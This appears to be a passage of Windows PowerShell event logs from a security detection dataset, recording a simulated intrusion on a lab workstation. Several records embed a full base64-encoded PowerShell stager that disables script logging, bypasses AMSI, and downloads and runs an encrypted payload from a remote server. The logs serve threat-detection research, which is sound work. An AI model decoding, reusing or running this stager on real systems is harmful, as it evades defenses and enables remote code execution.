{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:32","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":7456,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-9E63-0F856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":840,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-21 19:35:31","@timestamp":"2020-09-21T23:35:32.867Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":163818,"Payload":"CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Net.WebClient\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n        Pipeline ID = 1\r\n        Command Name = New-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 16271\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:33","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:35:31","Message":"Pipeline execution details for command line:                                 $script:Headers.GetEnumerator() | % {$5793.Headers.Add($_.Name, $_.Value)}\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=16272\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=                                $script:Headers.GetEnumerator() | % {$5793.Headers.Add($_.Name, $_.Value)}\n \r\n\r\nDetails: \r\nCommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$5793.Headers.Add($_.Name, $_.Value)\"\r\n","@timestamp":"2020-09-21T23:35:33.869Z","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":185100,"Task":8,"@version":"1","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"PowerShell","Category":"Pipeline Execution Details","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:35:33","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-21 19:35:31","Message":"Pipeline execution details for command line:                                 $taskURI = $script:TaskURIs | Get-Random\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=16274\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAX